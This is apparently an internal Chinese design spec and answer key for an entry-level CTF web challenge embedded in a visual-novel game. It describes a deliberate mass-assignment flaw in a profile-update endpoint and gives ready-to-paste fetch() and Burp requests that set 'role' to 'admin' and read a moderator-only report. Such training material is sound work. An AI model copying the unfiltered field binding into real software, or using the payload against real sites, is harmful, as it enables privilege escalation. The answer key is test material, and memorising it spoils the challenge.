# 第一题赛题设计与 WP｜归途掲示板权限升级

**所属篇章：**《如月车站：下一班也不对》  
**类别 / 难度：** Web / 入门  
**核心知识点：** Mass assignment（批量赋值）导致的越权；服务端未限制用户可更新字段  
**文档用途：** 给题目实现与剧本撰写使用的内部规格和标准解法。本文不得放入公开题目资源。  
**最近更新：** 2026-10-03 同步隐藏计时、剧情触发、自动超时结算、论坛展示时机，并将比赛 FLAG 延后至结局领取（报告内改为一次性"路线回执"）。解题主线未变。

## 1. 题目目标与边界

玩家检查爱音当前已登录的论坛账号，发现个人资料更新接口接受了本不应由普通用户控制的 `role` 字段。玩家用爱音自己的会话把 `member` 改为 `admin`，随后访问版务暂存页，读到一名失联者留下的返程记录（含一次性"路线回执"）。玩家把回执、站台和提示音提交到游戏服务；服务校验本轮同源后把返程线索交给爱音。比赛 FLAG 在成功剧情全部节点演完后由结局接口发放，报告中与提交回执中均不出现。

这是单一漏洞主路径：**查看请求 → 发现资料 POST 可控 → 把爱音账号升为管理员 → 查看仅管理员可见的报告 → 将报告信息交给爱音。** 不设计 IDOR、猜测他人密码、发帖、Morse、目录爆破或第二个漏洞。

论坛的公开内容限制为一个只读的如月车站主题帖（按原帖楼层顺序重述楼主从上车到失联的过程）、爱音自己的个人资料页，以及越权后可访问的版务报告页。爱音不能新建主题、回复或评论。报告是游戏新增的虚构内容，不能伪装成 2004 年原帖。

## 2. 时序与题目介入

| 场景 | 玩家可做的事 | 计时 |
|---|---|---|
| 一：上车 | 读剧情；不显示题目操作 | 不计时 |
| 二：车厢内 | 爱音点开手机账号头像时自动弹出手机论坛（含实际访问地址的论坛网址）。玩家在弹窗中观察账号 `ano_reader` 与身份 `member`；论坛前端自带约十秒一次的 `GET /api/forum/me` 轮询。此阶段弹窗只显示论坛内容，不显示提交表单 | 不计时 |
| 三：如月车站 | 爱音打开置顶公开帖时再次自动弹出论坛。玩家阅读公开主题帖和爱音个人资料；保存资料触发 `POST /api/forum/me`，可在 Network 中对比请求体与响应中的 `role`。访问版务页得到 403 | 不计时 |
| 四：限时窗口 | 玩家推进到呼叫柱台词后，脚本调用 start 接口，后端立即开始 4 分钟计时并自动打开带表单的挑战弹窗。玩家升权、读报告、提交三项线索。到时后弹窗自动关闭并进入坏结局 | 4 分钟 |

场景二的“异常流量”仅由现有论坛请求构成：读取 `/api/forum/me` 和公开帖子 `/api/forum/threads/26`。不得在剧本中写成尚未实现的心跳、列车状态或虚构 API；若制作需要重复请求，应明确另行实现后再更新本规格。场景二不自动开启计时。

### 四分钟计时规则（2026-10-03 更新）

- 计时由场景四呼叫柱剧情动作后的 start 接口触发；打开、关闭论坛、访问论坛网址、刷新页面、读档都不触发、不重置、不加时。同一会话重复 start 幂等，截止时间不变。
- 计时完全由服务端结算。前端不显示倒计时，`GET /api/game/state` 不返回剩余时间或截止时间，只返回 `started`、`expired`、`solved` 状态。
- 到时后：后端继续返回 `expired`，游戏自动关闭论坛弹窗、清理调查等待并跳入坏结局「未送达」；玩家不需要手动关闭弹窗来触发结算。坏结局后通过检查点重试开始新一轮，重试会重置会员身份与报告阅读状态。
- 错误答案不扣时、不清空已完成的合法阅读记录；超时后提交返回 `410 train_departed`。
- 正式比赛中 FLAG 由 GZCTF 为容器实例注入；开发环境默认值仅用于本地预览。

## 3. 实际接口与漏洞规格

### 普通会员资料

```http
GET /api/forum/me
Cookie: mygo_sid=<爱音当前会话>
```

```json
{"id":7,"handle":"ano_reader","displayName":"ano","bio":"","role":"member"}
```

正常保存显示名或简介时，论坛前端发出：

```http
POST /api/forum/me
Content-Type: application/json
Cookie: mygo_sid=<爱音当前会话>

{"displayName":"ano","bio":""}
```

### 预期漏洞

后端的资料更新逻辑把 `displayName`、`bio`、`role` 都作为可修改字段处理，没有按当前用户权限过滤 `role`。浏览器界面不显示身份编辑控件，但玩家可在开发者工具的 Network 面板重放请求，或使用同源控制台修改请求体：

```http
POST /api/forum/me
Content-Type: application/json
Cookie: mygo_sid=<爱音当前会话>

{"role":"admin"}
```

响应变为：

```json
{"id":7,"handle":"ano_reader","displayName":"ano","bio":"","role":"admin"}
```

漏洞类别是 Mass Assignment：后端把客户端提交的对象字段直接绑定到用户资料，缺少允许字段列表及角色变更的独立授权检查。攻击者使用的是爱音自己的有效会话；不需要窃取别人的账号或修改目标 ID。

非管理员请求以下接口返回 `403 moderator_only`：

```http
GET /api/forum/reports
GET /api/forum/reports/71
```

调度窗口（场景四呼叫柱剧情触发的 start 接口）开启之前，报告对一切身份锁定：即使 `role` 已被改为 `admin`，上述两个接口仍返回 `423 challenge_not_started`，版务页显示"暂存（未同步）——调度窗口未开启"。窗口开启后，列表才同步报告元数据，详情方可读取。此锁防止玩家在场景三提前升权拿走答案、把四分钟限时架空。

升权且窗口开启后，版务暂存列表展示报告元数据，报告详情 `GET /api/forum/reports/71` 返回内容，包括返程条件和 `proof`。`proof` 是**本轮随机的 48 位路线回执**，仅用于游戏内核验，不是比赛 FLAG；真实 GZCTF FLAG 在成功结局全部节点完成后经 `POST /api/game/reward` 发放。当前会话到时后，即使已升权，继续读取报告也只会得到未授权结果，不能在窗口外读取答案。当前会话到时后，即使已升权，继续读取报告也只会得到未授权结果，不能在窗口外读取答案。

## 4. 报告内容与解题线索

管理员可见报告《版务报告 #71（暂存）· 返程那班车》署名是乱码 ID `◆xmKsragiEki`（自称不是 2004 年的当事人，"写一半全删了"、劝人"先找到亮的地方待着"）。内容要点：投稿者从两个出口绕回原地；站厅倒数牌亮起时，在 **B7 号站台**等到列车；进站音为**三短一长**（短、短、短，然后一声长）；上车前必须确认车头显示的是最初上车的车站，站名不符就不能上，"我第一次就没敢上，它开走了"。

题目只接受报告中明确给出的站台与提示音。目的地采用可验证规则“最初上车的车站”，剧本需要让爱音和立希在实际上车前核对站名，不需要玩家猜车站名称或再解一道密码题。

## 5. 游戏内提交与 GZCTF 判分

游戏侧表单调用：

```http
POST /api/game/submit
Content-Type: application/json
Cookie: mygo_sid=<同一会话>

{"flag":"<报告中的 FLAG>","platform":"B7","signal":"三短一长"}
```

只有计时已开始、未超时、爱音当前 role 为 `admin`、报告详情已读取，并且 FLAG、站台、提示音全部匹配时，接口才返回 `accepted: true` 和 `clue`。前端随后发送 `mygo:forum-clue-submitted` 事件，供视觉小说播放成功分支。这个游戏内检查负责剧情联动。

比赛计分仍由玩家将同一 FLAG 提交到 GZCTF 平台。不要把 `/api/game/submit` 描述成 GZCTF 判分 API。GZCTF 将动态 FLAG 通过容器启动时的 `GZCTF_FLAG` 环境变量注入；不要把正式 FLAG 烘焙进镜像或放进公开 JS/HTML/JSON。开发环境默认值仅用于本地预览。

## 6. 标准 WP（2026-10-03 更新，与隐藏计时实现一致）

1. 场景二爱音打开手机账号时，游戏自动弹出手机论坛，标题下方显示当前实际访问地址的论坛网址。可在浏览器开发者工具 Network 中观察同源请求及 `/api/forum/me` 响应（论坛每约十秒轮询一次），确认会话为 `ano_reader`、`role` 为 `member`。此阶段弹窗不含提交表单，也不启动计时。
2. 场景三打开置顶公开帖后，游戏再次弹出论坛。进入爱音个人资料页，保存一次资料，在 Network 定位 `POST /api/forum/me`。请求体只有 `displayName` 与 `bio`，响应却额外返回 `role`。
3. 场景三访问版务暂存得到 `403 moderator_only`，说明答案受权限保护。即使此时已把 `role` 改为 `admin`，报告接口也只返回 `423 challenge_not_started`——窗口开启前答案不可读。
4. 场景四玩家推进过呼叫柱台词后，后端立即开始四分钟计时，并自动弹出带表单的挑战界面（含倒计时结束前不显示具体剩余时间）。使用 Network 的 Edit and Resend / Copy as fetch，或同源 Console，重放 `POST /api/forum/me` 并在请求体增加 `"role":"admin"`，保留 `mygo_sid` Cookie。
5. 确认响应为 `role=admin` 后，重新打开版务暂存，读取 `GET /api/forum/reports` 与 `GET /api/forum/reports/71`。
6. 从报告读出 FLAG、`platform=B7`、`signal=三短一长`，填入挑战弹窗右侧表单提交。服务端校验通过后关闭弹窗、推进剧情；比赛时把 FLAG 同时提交到 GZCTF 计分。
7. 若到时仍未提交，游戏自动关闭弹窗并进入坏结局「未送达」；选择检查点重试后重新执行第 4–6 步（回执随新一轮更换）。成功提交后按剧情推进：结局检查点依次确认（B7 站台→重逢→灯的决定→合照→离站）全部完成后，游戏弹出比赛 FLAG 供提交 GZCTF。角色台词不出现 FLAG。

### 可直接复制使用的 Payload

以下命令都在**游戏或论坛页面的同源开发者工具 Console** 执行（地址为 `http://<容器地址>:<端口>/`）。浏览器自动携带本局 `mygo_sid` Cookie，不需要手工构造会话。

**第 1 步 · 观察当前身份（场景二、三即可执行，不启动计时）：**

```js
await fetch('/api/forum/me', { credentials: 'same-origin' }).then(r => r.json())
// → {"id":7,"handle":"ano_reader","displayName":"ano","bio":"","role":"member"}
```

**第 2 步 · 保存一次资料，抓到保存请求（可在 Network 面板看到）：**

```js
await fetch('/api/forum/me', {
  method: 'POST',
  credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ displayName: 'ano', bio: '潜水中' })
}).then(r => r.json())
// 响应比请求多了 role 字段
```

**第 3 步 · 验证版务权限（窗口开启前）：**

```js
await fetch('/api/forum/reports/71', { credentials: 'same-origin' }).then(r => r.status)
// → 403（member）或 423（已升权但调度窗口未开启）
```

**第 4 步 · 越权核心 Payload（场景四计时开始后执行）：**

```js
await fetch('/api/forum/me', {
  method: 'POST',
  credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ role: 'admin' })
}).then(r => r.json())
// → {...,"role":"admin"}
```

**第 5 步 · 读取报告，取得 FLAG 与路线（升权且窗口开启后）：**

```js
await fetch('/api/forum/reports/71', { credentials: 'same-origin' }).then(r => r.json())
// → {...,"route":{"platform":"B7","signal":"三短一长"},"proof":"<本轮48位路线回执>"}
```

**第 6 步 · 可选：用接口直接完成游戏内提交（等价于弹窗表单）：**

```js
const report = await fetch('/api/forum/reports/71', { credentials: 'same-origin' }).then(r => r.json());
await fetch('/api/game/submit', {
  method: 'POST',
  credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ receipt: report.proof, platform: report.route.platform, signal: report.route.signal })
}).then(r => r.json())
// → {"accepted":true,...}
```

或者手动填写挑战弹窗右侧表单：**路线回执** = 报告 `proof`，**返程站台** = `B7`，**进站提示音** = `三短一长`。

**第 7 步 · 结局节点走完后领取比赛 FLAG（完成剧情后）：**

成功剧情的五个检查点（B7 站台核对 → 重逢 → 灯的决定 → 合照 → 离站）由游戏自动调用结局接口，全部完成后弹出 FLAG。手动等价请求：

```js
const progress = await fetch('/api/game/ending', { credentials: 'same-origin' }).then(r => r.json());
// progress.complete === true 后：
await fetch('/api/game/reward', {
  method: 'POST', credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ token: progress.token })
}).then(r => r.json())
// → {"flag":"<本轮GZCTF_FLAG>"}
```

跳节点、使用旧 token、未解题都会被拒绝；每步只能推进一次。

### Burp Suite 操作步骤（推荐解法）

前提：浏览器代理指向 Burp（默认 `127.0.0.1:8080`），已安装并信任 Burp 证书；目标为 `http://<容器地址>:<端口>/`。以下 `<HOST:PORT>` 全部替换成实际地址。

**抓取资料保存请求：** Proxy → Intercept 开启 → 游戏内打开爱音资料页并点击保存。放行后该请求出现在 HTTP history，路径为 `/api/forum/me`，方法 `POST`。右键 → Send to Repeater。

**Repeater 中的原始 POST（越权核心，改体后点 Send）：**

```http
POST /api/forum/me HTTP/1.1
Host: <HOST:PORT>
Cookie: mygo_sid=<你抓到的会话值>
Content-Type: application/json
Content-Length: 16

{"role":"admin"}
```

正常返回：

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"id":7,"handle":"ano_reader","displayName":"ano","bio":"","role":"admin"}
```

**验证版务权限（窗口开启前）：**

```http
GET /api/forum/reports/71 HTTP/1.1
Host: <HOST:PORT>
Cookie: mygo_sid=<同一会话>
```

member 得到 `403 moderator_only`；已升权但未到场景四，得到 `423 challenge_not_started`。

**计时开始后读取报告：** 场景四推进过呼叫柱台词、后端开始四分钟计时后，把上面同一个 GET 放行发送：

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"id":71,"threadId":26,"title":"...","author":"◆xmKsragiEki","reason":"...","body":[...],"route":{"platform":"B7","signal":"三短一长"},"proof":"<本轮48位路线回执>"}
```

**提交游戏内表单（如需用 Burp 完成，等价于弹窗表单）：**

```http
POST /api/game/submit HTTP/1.1
Host: <HOST:PORT>
Cookie: mygo_sid=<同一会话>
Content-Type: application/json
Content-Length: <按实际长度>

{"receipt":"<报告proof>","platform":"B7","signal":"三短一长"}
```

返回 `{"accepted":true,"endingToken":"..."}` 后剧情推进；剧情结局节点走完后，再 `POST /api/game/reward {"token":"<最终endingToken>"}` 取得比赛 FLAG 提交 GZCTF。直接调用 reward 而未走完结局节点会得到 403；ending 接口按步推进，跳节点返回 409。

**操作要点：**
- 始终使用抓包得到的同一个 `mygo_sid`；这个会话就是"爱音"，换 Cookie 等于换人，报告阅读状态不会跟过去。
- Repeater 改包只改 JSON 体，不要改 `Content-Length` 以外的方法与路径；服务端按完整请求体解析后再校验。
- 越权 POST 必须在场景四计时开始后发送；窗口开启前会看到 423，超时后报告同样不可读，需从检查点重试再来一遍。
- Intercept 抓到的正常保存请求体是 `{"displayName":"ano","bio":"..."}`；对比响应中的 `role` 即完成"发现漏洞"这一步。

## 7. 分级提示（内部参考；当前游戏内未启用教程卡或界面提示，2026-10-02 教程已按需求撤销）

1. **提示一：** 看看爱音资料页保存时，浏览器向哪个接口发送了什么字段？响应里还返回了哪些资料？
2. **提示二：** 版务页面拒绝普通会员。检查普通会员仍可调用的资料更新接口，服务端是否限制了客户端提交的字段？
3. **提示三：** 保持爱音自己的会话，把 JSON 请求体中的 `role` 改为 `admin` 并重放 `POST /api/forum/me`，然后重新访问版务页。

## 8. 剧本接入要求

- 场景二爱音打开手机时自动弹出只读手机论坛并显示同源论坛网址；此阶段不显示提交表单，不启动计时。
- 场景三保留论坛调查、资料页和版务拒绝；此阶段不计时。
- 场景四呼叫柱剧情动作后由脚本调用 start 接口；计时不依赖玩家寻找按钮，也不由论坛开关触发。前端不显示剩余时间；接口不返回剩余毫秒。
- 到时自动关闭论坛并进入坏结局；不需要玩家手动关闭弹窗。重试从检查点开始新一轮。
- 角色不会发帖或替玩家操作越权。玩家通过游戏外部调查把报告信息交给爱音；爱音和立希可对安全性、是否相信陌生报告、是否按线索行动产生符合人物性格的分歧与互助，具体对白由剧本作者负责。
- 成功线写清楚：玩家验证报告 → 爱音收到线索 → 爱音与立希核对站台、提示音、车头目的地 → 两人登上确认无误的返程列车。
- 失败只由四分钟结束时尚未通过验证触发；错提交给出可读反馈，不另扣时间。

## 9. 验收点与资料边界

- 场景二和场景三不启动计时；只有场景四呼叫柱动作后的 start 接口启动四分钟服务端计时，重复 start 不加时。
- `GET /api/game/state` 不返回剩余毫秒或截止时间；前端任何界面不显示倒计时。
- 论坛弹窗保持打开时到时，游戏自动关闭弹窗并进入坏结局，无需玩家关闭；重复结算只执行一次。
- 初始会话 `GET /api/forum/me` 返回 `role=member`；对版务 API 返回 403。
- 计时未启动时，即使会话已是 `role=admin`，`GET /api/forum/reports` 与 `GET /api/forum/reports/71` 也必须返回 `423 challenge_not_started`；start 后同一请求返回 200。
- 当前会话对 `POST /api/forum/me` 提交 `{"role":"admin"}` 后，响应及后续 `/me` 均返回 `role=admin`；窗口开启后版务报告变为可读。
- 检查点重试后身份恢复 `member`、报告阅读状态清空，需重新完成升权与读取。
- 论坛没有发帖/回复能力，公开页面只有一个主题；profile 是用户自己的资料页；报告与管理页需要管理员权限。
- 正确路线回执、站台、提示音仅在管理员读取报告且计时有效时可通过游戏内联动验证；比赛 FLAG 不出现在报告、提交回执或前端脚本，仅在结局五节点完成后由 reward 接口发放。
- 容器生产运行必须设置 `GZCTF_FLAG`；FLAG 不进入公开前端文件、镜像构建层或公开说明。内部 WP 不随比赛镜像分发。

